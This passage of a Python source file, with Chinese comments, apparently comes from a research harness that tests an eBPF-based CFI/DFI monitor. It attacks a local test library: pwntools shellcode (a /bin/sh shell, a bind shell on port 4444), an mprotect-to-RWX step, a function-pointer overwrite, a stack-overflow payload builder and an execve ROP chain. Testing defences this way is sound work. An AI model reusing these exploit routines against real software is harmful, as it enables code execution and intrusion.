            log.warning(f"ROP gadget search failed: {e}")

        return gadgets

    def generate_shellcode(self, sc_type='sh'):
        """使用 pwntools 生成 shellcode"""
        if sc_type == 'sh':
            sc = asm(shellcraft.sh())
        elif sc_type == 'cat_flag':
            sc = asm(shellcraft.cat('flag.txt'))
        elif sc_type == 'bind':
            sc = asm(shellcraft.bindsh(4444, '0.0.0.0'))
        elif sc_type == 'simplenop':
            sc = RIPE_SHELLCODE_SIMPLENOP
        elif sc_type == 'nonop':
            sc = RIPE_SHELLCODE_NONOP
        elif sc_type == 'exit0':
            sc = asm('mov rax, 60; mov rdi, 0; syscall')
        else:
            sc = asm(shellcraft.sh())

        log.info(f"Generated shellcode ({sc_type}): {len(sc)} bytes")
        return sc

    def overwrite_indirect_call_ptr(self, lib_handle, new_target):
        """覆盖 indirect_call_ptr 全局变量（参考 ripe_attack_test.c）"""
        libc = ctypes.CDLL("libc.so.6")

        # 用 dlsym 精确获取符号在已加载库中的真实地址
        libc.dlsym.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
        libc.dlsym.restype = ctypes.c_void_p
        ptr_addr = libc.dlsym(lib_handle._handle, b'indirect_call_ptr')
        if not ptr_addr:
            log.failure("[ATTACK] dlsym(indirect_call_ptr) failed")
            return False

        original = ctypes.c_uint64.from_address(ptr_addr).value
        log.info(f"[ATTACK] indirect_call_ptr @ 0x{ptr_addr:x}")
        log.info(f"[ATTACK] Original value: 0x{original:x}")

        page_size = 4096
        page_start = ptr_addr & ~(page_size - 1)

        try:
            libc.mprotect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int]
            libc.mprotect.restype = ctypes.c_int
            result = libc.mprotect(page_start, page_size, 7)  # PROT_READ|WRITE|EXEC
            if result == 0:
                log.success("[ATTACK] mprotect: page made RWX")

                ctypes.c_uint64.from_address(ptr_addr).value = new_target
                new_val = ctypes.c_uint64.from_address(ptr_addr).value
                log.success(f"[ATTACK] Overwrote indirect_call_ptr -> 0x{new_val:x}")
                return True
            else:
                log.failure(f"mprotect failed: errno={ctypes.get_errno()}")
                return False
        except Exception as e:
            log.failure(f"Overwrite failed: {e}")
            return False

    def build_stack_overflow_payload(self, buffer_addr, shellcode, rip_offset,
                                      target_func_addr=None):
        """构建 pwntools 风格的栈溢出 payload

        Args:
            buffer_addr: 栈缓冲区地址（shellcode 存放位置）
            shellcode: shellcode 字节
            rip_offset: 返回地址的栈偏移量
            target_func_addr: 可选，覆盖返回地址为特定函数
        """
        payload = shellcode
        payload += b'A' * (rip_offset - len(payload))

        if target_func_addr:
            payload += p64(target_func_addr)
        else:
            payload += p64(buffer_addr)

        return payload

    def build_indirect_call_exploit(self, lib_handle, shellcode_addr):
        """构建针对 indirect_call_ptr 的利用（参考 ripe_attack_test.c）

        直接覆盖全局函数指针 indirect_call_ptr 为 shellcode 地址
        """
        success = self.overwrite_indirect_call_ptr(lib_handle, shellcode_addr)
        return success

    def craft_rop_chain_for_execve(self, bin_sh_addr=0):
        """构建 execve('/bin/sh', 0, 0) 的 ROP 链

        使用 pwntools 自动搜索 gadgets 并构建链
        """
        try:
            if bin_sh_addr == 0:
                bin_sh_addr = next(self.elf.search(b'/bin/sh'))
                if bin_sh_addr:
                    log.info(f"Found '/bin/sh' string @ 0x{bin_sh_addr:x}")
                    bin_sh_addr = self.base + bin_sh_addr - self.elf.address

            rop = ROP(self.elf)

            if rop.rdi and rop.rsi and rop.rax and rop.syscall:
                chain = p64(self.base + rop.rax.address - self.elf.address)
                chain += p64(constants.SYS_execve)
                chain += p64(self.base + rop.rdi.address - self.elf.address)
                chain += p64(bin_sh_addr if bin_sh_addr else 0)
                chain += p64(self.base + rop.rsi.address - self.elf.address)
                chain += p64(0)
                chain += p64(self.base + rop.rdx.address - self.elf.address) if rop.rdx else b''
                chain += p64(0)
                chain += p64(self.base + rop.syscall.address - self.elf.address)
                log.success("Crafted execve ROP chain")
                return chain
            else:
                log.warning("Missing gadgets for full execve ROP chain")
                return None
        except Exception as e:
            log.warning(f"ROP chain crafting failed: {e}")
            return None


# ======================== 主程序 ========================

def main():
    global b, event_count, violation_count, base, cfi_lookup, layer_event_count, attack_triggered, legitimate_sets
    event_count = 0
    layer_event_count = 0
    violation_count = 0
    attack_triggered = False
    cfi_lookup = {}
    legitimate_sets = {}

    script_dir = os.path.dirname(os.path.abspath(__file__))
    so_path = os.path.join(script_dir, "test.so")
    if not os.path.exists(so_path):
        print(f"错误：找不到 {so_path}")
        return

    # ---- Phase 1: 解析三层 DFI 链 ----
    print("\n" + "=" * 60)
    print("[Phase 1] 解析三层 DFI 数据流链")
    print("=" * 60)
    layer_chains, func_bases = parse_df1_layer_chains()
    print(f" 发现 {len(layer_chains)} 个间接跳转站点:")
    for chain in layer_chains:
        print(f"  * {chain['func']} @ 0x{chain['jump_addr']:x}  reg={chain['reg']}")
        for layer in chain['layers']:
            itype_names = {0: "DIRECT", 1: "DEREF", 2: "RIP_REL", 3: "RBP_REL", 4: "RET"}
            itname = itype_names.get(layer.get('instr_type', 0), "?")
            print(f"     L{layer['level']}: 0x{layer['def_addr']:x} type={itname} -> {layer['instr']}")

    # ---- Phase 2: 解析 CFI 表 ----
    print(f"\n{'='*60}")
    print("[Phase 2] 加载 CFI 规则表")
    print("=" * 60)
    table = parse_cfi_table("test_jump_analysis.csv")
    for entry in table:
        cfi_lookup[entry['src_addr']] = entry

    legitimate_sets, func_heads = build_legitimate_target_sets(table)

    static_offset = None
    for entry in table:
        if entry['src_func'].decode() == "test_returns":
            static_offset = entry['src_func_addr']
            break
    if static_offset is None:
        print("错误：无法从 CSV 中找到 test_returns 函数起始地址")
        return

    # ---- Phase 3: 加载 BPF 监控 ----
    print(f"\n{'='*60}")
    print("[Phase 3] 加载 BPF 程序 + 三层DFI保护")
    print("=" * 60)
    b = BPF(text=get_bpf_text())

    lib = ctypes.CDLL(so_path)
    func_addr = ctypes.cast(getattr(lib, "test_returns"), ctypes.c_void_p).value
    base = get_module_base_from_maps("test.so")
    print(f"[*] test.so 基址: 0x{base:x}")

    b["module_base"][ctypes.c_uint64(0)] = ctypes.c_uint64(base)

    for entry in table:
        offset = ctypes.c_uint64(entry['src_addr'])
        cfi = CfiEntry(**{k: v for k, v in entry.items()
                           if k in [f[0] for f in CfiEntry._fields_]})
        b["cfi_map"][offset] = cfi

    for head in func_heads:
        b["func_heads"][ctypes.c_uint64(head)] = ctypes.c_uint32(1)

    b["jump_events"].open_perf_buffer(handle_jump_event)
    b["dfi_layer_events"].open_perf_buffer(handle_df1_layer_event)

    # 挂载三层 DFI + CFI uprobes
    reg_to_idx = REG_TO_IDX
    attached = {}

    for site_id, chain in enumerate(layer_chains):
        if chain['reg'] == 'rsp' and chain['layers'][0]['instr_type'] == 4:
            l1 = chain['layers'][0]
            sym = chain['func'].split('@')[0]
            b.attach_uprobe(name=so_path, sym=sym, sym_off=0, fn_name="trace_ret_target")
            b.attach_uprobe(name=so_path, sym=sym, sym_off=l1['offset'], fn_name="trace_all_jumps")
            continue

        reg_idx = reg_to_idx.get(chain['reg'], 0)
        func = chain['func']
        sym_name = func.split('@')[0]

        for layer in chain['layers']:
            level = layer['level']
            def_addr = layer['def_addr']
            sym_off = layer['offset']
            addr_key = (sym_name, sym_off)

            if level == 1:
                fn_name = "trace_df1_l1"
            elif level == 2:
                fn_name = "trace_df1_l2"
            else:
                fn_name = "trace_df1_l3"

            if level != 1 and addr_key in attached:
                existing = attached[addr_key]
                if level == 2:
                    pass
                elif level == 3 and existing == "trace_df1_l2":
                    continue
                else:
                    continue

            meta = DfiLayerMeta()
            meta.site_id = site_id
            meta.reg_sel = reg_idx
            meta.instr_type = layer.get('instr_type', 0)
            meta.extra = layer.get('extra', 0)
            meta.instr_len = layer.get('instr_len', 0)
            meta.need_deref = layer.get('need_deref', 0)
            meta.save_target_to_saved_rax = 1 if level == 2 else 0
            fn_bytes = chain['func'].encode('utf-8')[:63]
            meta.func_name = fn_bytes

            cfg_key = ctypes.c_uint64(def_addr)
            if level == 1:
                b["dfi_l1_cfg"][cfg_key] = meta
            elif level == 2:
                b["dfi_l2_cfg"][cfg_key] = meta
            else:
                b["dfi_l3_cfg"][cfg_key] = meta

            try:
                b.attach_uprobe(name=so_path, sym=sym_name, sym_off=sym_off, fn_name=fn_name)
                if level != 1:
                    attached[addr_key] = fn_name
            except Exception as e:
                pass

        if level == 1:
            try:
                b.attach_uprobe(name=so_path, sym=sym_name, sym_off=sym_off,
                                fn_name="trace_all_jumps")
            except Exception as e:
                pass

    # ---- Phase 4: pwntools 式 ROP 攻击 ----
    print(f"\n{'='*60}")
    print("[Phase 4] pwntools 式 ROP 攻击 (参考 ripe_attack_test.c)")
    print("=" * 60)

    engine = ROPAttackEngine(so_path, base)

    # 列出 ELF 基本信息
    log.info(f"Sections: {[s.name for s in engine.elf.sections[:10]]}...")
    log.info(f"Symbols in .dynsym: indirect_call_ptr={('indirect_call_ptr' in engine.elf.symbols)}")

    # 查找 ROP gadgets
    gadgets = engine.find_rop_gadgets()

    # 生成 shellcode
    print(f"\n[ATTACK] 选择攻击向量:")
    print(f"  1. simplenop  shellcode (RIPE风格)")
    print(f"  2. /bin/sh   shellcode (pwntools)")
    print(f"  3. nonop     shellcode (RIPE纯shellcode)")
    print(f"  4. exit(0)   shellcode (安全退出，不替换进程)")

    attack_choice = 2
    sc_type_map = {1: 'simplenop', 2: 'sh', 3: 'nonop', 4: 'exit0'}
    sc_type = sc_type_map.get(attack_choice, 'exit0')

    shellcode = engine.generate_shellcode(sc_type)

    libc = ctypes.CDLL("libc.so.6")
    libc.mmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int,
                           ctypes.c_int, ctypes.c_int, ctypes.c_long]
    libc.mmap.restype = ctypes.c_void_p
    libc.mprotect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int]
    libc.mprotect.restype = ctypes.c_int
    libc.memmove.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
    libc.memmove.restype = ctypes.c_void_p
    libc.munmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t]
    libc.munmap.restype = ctypes.c_int
    libc.getpagesize.argtypes = []
    libc.getpagesize.restype = ctypes.c_int

    page_size = libc.getpagesize()
    sc_size = ((len(shellcode) + page_size - 1) // page_size) * page_size

    MAP_PRIVATE = 2
    MAP_ANONYMOUS = 0x20
    PROT_RW = 3
    PROT_RX = 5

    sc_ptr = libc.mmap(None, sc_size, PROT_RW, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)
    if sc_ptr == ctypes.c_void_p(-1).value:
        log.failure(f"mmap for shellcode failed: errno={ctypes.get_errno()}")
        return

    ctypes.memmove(sc_ptr, bytes(shellcode), len(shellcode))
    ret = libc.mprotect(sc_ptr, sc_size, PROT_RX)
    if ret != 0:
        log.warning(f"mprotect PROT_RX failed: errno={ctypes.get_errno()}, trying RWX")
        ret = libc.mprotect(sc_ptr, sc_size, 7)
        if ret != 0:
            log.failure(f"mprotect RWX also failed: errno={ctypes.get_errno()}")
            libc.munmap(sc_ptr, sc_size)
            return

    shellcode_addr = sc_ptr

    print(f"\n[ATTACK] Shellcode @ 0x{shellcode_addr:x} ({len(shellcode)} bytes)")
    print(f"[ATTACK] Hex: {shellcode[:16].hex()}...")

    # 执行 indirect_call_ptr 覆盖攻击
    print(f"\n[ATTACK] 攻击目标: indirect_call_ptr -> shellcode")
    print(f"[ATTACK] 攻击方法: 覆盖全局函数指针 (GOT/literal pool)")
    print(f"[ATTACK] 触发方式: 调用 test_indirect_call()")

    attack_success = engine.build_indirect_call_exploit(lib, shellcode_addr)

    # 构建 stash buffer 用于存储符号地址等（如果有的话）
    stash_buf = ctypes.create_string_buffer(b'\x90' * 4096)
    stash_addr = ctypes.addressof(stash_buf)

    # ---- Phase 5: 触发攻击 + 监控 ----
    print(f"\n{'='*60}")
    print("[Phase 5] 触发攻击并监控 CFI 事件")
    print("=" * 60)

    def trigger_attack():
        time.sleep(2)
        print(f"\n[!] 触发攻击: 调用 test_indirect_call() ...")
        print(f"    indirect_call_ptr 已被覆盖为 shellcode 地址")
        try:
            lib.test_indirect_call()
        except Exception as e:
            print(f"[!] test_indirect_call 异常 (可能已执行shellcode): {e}")

        time.sleep(1)
        print(f"\n[!] 正常调用 test_all() 作为对照...")
        try:
            lib.test_all()
        except Exception as e:
            print(f"[!] test_all 异常: {e}")

    attack_thread = threading.Thread(target=trigger_attack, daemon=True)
    attack_thread.start()

    print("\n=== CFI + 三层DFI 监控已启动 (ROP Attack Mode) ===")
    print("按 Ctrl+C 停止\n")

    try:
        while True:
            b.perf_buffer_poll(timeout=100)
    except KeyboardInterrupt:
        print("\n监控已停止")
    finally:
        print(f"\n{'='*60}")
        print("最终统计")
        print("=" * 60)
        print(f"  CFI规则数:     {len(table)}")
        print(f"  处理事件数:   {event_count}")
        print(f"  CFI违规数:    {violation_count}")
        print(f"  三层DFI事件数: {layer_event_count}")
        print(f"  ROP攻击检测:  {'检测到攻击!' if attack_triggered else '未检测到异常跳转'}")
        if event_count > 0:
            violation_rate = (violation_count / event_count) * 100
            print(f"  违规率:       {violation_rate:.2f}%")

        print(f"\n[RIPE Attack 分析]")
        if attack_success:
            print(f"  indirect_call_ptr 覆盖: 成功")
            print(f"  Shellcode 地址:         0x{shellcode_addr:x}")
            print(f"  如果 CFI 未检测到违规 -> 说明攻击绕过了 CFI 检测")
        else:
            print(f"  indirect_call_ptr 覆盖: 失败 (内存保护)")

        if attack_triggered:
            print(f"  [!] CFI成功检测到间接跳转目标劫持")
        else:
            print(f"  [?] 未收到CFI事件 - 检查uprobe是否正确挂载")


if __name__ == "__main__":
    main()
